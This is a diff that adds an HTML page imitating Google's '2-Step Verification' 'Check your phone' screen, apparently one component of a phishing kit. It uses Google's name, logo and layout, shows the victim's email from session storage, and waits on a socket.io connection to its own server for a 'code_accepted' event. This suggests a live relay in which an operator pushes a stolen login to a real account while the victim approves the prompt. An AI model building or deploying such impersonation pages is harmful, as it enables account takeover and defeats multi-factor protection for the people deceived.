@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2-Step Verification</title>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap');
+
+        :root {
+            --bg: #000000;
+            --card-bg: #000000;
+            --card-border: #3c4043;
+            --text-primary: #ffffff;
+            --text-secondary: #9aa0a6;
+            --input-border: #3c4043;
+            --input-focus: #8ab4f8;
+            --link-color: #8ab4f8;
+            --btn-bg: #8ab4f8;
+            --btn-text: #000000;
+            --error: #f28b82;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text-primary);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .page-wrap {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            border: 1px solid var(--card-border);
+            padding: 48px 40px 36px;
+            width: 520px;
+            max-width: 100%;
+            animation: fadeSlideIn 0.35s ease-out;
+        }
+
+        @keyframes fadeSlideIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .g-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 24px;
+            display: block;
+        }
+
+        h1 {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 12px;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 20px;
+            margin-bottom: 8px;
+        }
+
+        .email-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 2px 10px 2px 4px;
+            margin: 8px 0 0;
+            font-size: 14px;
+        }
+
+        .card-inner {
+            display: flex;
+            gap: 40px;
+        }
+
+        .card-left {
+            flex: 0 0 auto;
+            min-width: 200px;
+        }
+
+        .card-right {
+            flex: 1 1 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .phone-body {
+            width: 80px;
+            height: 140px;
+            background: #3c4043;
+            border-radius: 12px;
+            border: 2px solid #5f6368;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .phone-screen {
+            width: 68px;
+            height: 110px;
+            background: var(--bg);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .phone-check {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #34A853;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: phonePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes phonePulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(52, 168, 83, 0.4);
+            }
+
+            50% {
+                transform: scale(1.1);
+                box-shadow: 0 0 0 10px rgba(52, 168, 83, 0);
+            }
+        }
+
+        .phone-check svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+
+        .phone-notch {
+            width: 30px;
+            height: 4px;
+            background: #5f6368;
+            border-radius: 2px;
+            margin-top: 4px;
+        }
+
+        .prompt-title {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .prompt-desc {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 20px;
+        }
+
+        .waiting-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-top: 20px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .link {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .btn-row {
+            display: flex;
+            justify-content: flex-end;
+            gap: 16px;
+            margin-top: 32px;
+            width: 100%;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px 24px;
+            flex-shrink: 0;
+        }
+
+        .footer select {
+            background: transparent;
+            color: var(--text-secondary);
+            border: none;
+            font-size: 13px;
+            outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+            padding-right: 16px;
+            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='5' fill='%239aa0a6'%3E%3Cpath d='M0 0l5 5 5-5z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right center;
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 28px;
+        }
+
+        .footer-right a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background: var(--card-bg);
+            }
+
+            .page-wrap {
+                align-items: flex-start;
+                padding: 0;
+            }
+
+            .card {
+                border: none;
+                border-radius: 0;
+                width: 100%;
+                padding: 40px 24px 20px;
+            }
+
+            .card-inner {
+                flex-direction: column;
+                gap: 24px;
+            }
+
+            .card-left {
+                min-width: 0;
+            }
+
+            .footer {
+                background: var(--card-bg);
+                padding: 12px 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrap">
+        <div class="card">
+            <div class="card-inner">
+                <div class="card-left">
+                    <img class="g-logo" src="/static/google.png" alt="Google">
+                    <h1>2-Step Verification</h1>
+                    <p class="desc">To help keep your account safe, Google wants to make sure it's really you trying to
+                        sign in</p>
+                    <div class="email-chip"><svg width="20" height="20" viewBox="0 0 24 24" fill="#9aa0a6">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                        </svg><span id="emailDisplay"></span><svg width="18" height="18" viewBox="0 0 24 24"
+                            fill="#9aa0a6">
+                            <path d="M7 10l5 5 5-5z" />
+                        </svg></div>
+                </div>
+                <div class="card-right">
+                    <div class="phone-body">
+                        <div class="phone-screen">
+                            <div class="phone-check"><svg viewBox="0 0 24 24">
+                                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                </svg></div>
+                        </div>
+                        <div class="phone-notch"></div>
+                    </div>
+                    <p class="prompt-title">Check your phone</p>
+                    <p class="prompt-desc">Tap <strong>Yes</strong> on your phone or tablet to confirm it's you</p>
+                    <p class="waiting-text">Waiting for your response...</p>
+                    <div class="btn-row"><a href="#" class="link">Try another way</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-left"><select>
+                <option>English (United States)</option>
+            </select></div>
+        <div class="footer-right"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        document.getElementById('emailDisplay').textContent = sessionStorage.getItem('userEmail') || '';
+        socket.on('code_accepted', function () { document.querySelector('.card').style.opacity = '0'; document.querySelector('.card').style.transition = 'opacity 0.3s'; });
+    </script>
+</body>
+
+</html>
